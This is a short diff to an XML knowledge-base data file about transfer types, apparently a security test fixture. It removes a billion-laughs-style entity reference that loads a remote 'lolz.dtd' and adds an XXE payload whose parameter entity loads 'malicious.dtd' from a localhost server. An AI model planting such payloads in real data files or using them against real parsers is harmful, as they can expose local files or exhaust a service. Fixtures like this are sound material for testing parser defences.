@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data SYSTEM "https://localhost:5001/lolz.dtd">
-<data>&lol9;</data>
+<!DOCTYPE root [
+ <!ENTITY % xxe SYSTEM "http://localhost:8000/malicious.dtd">
+ %xxe;
+]>
 <knowledgebase>
    <knowledge>
       <topic lang="en">Types of Transfers</topic>
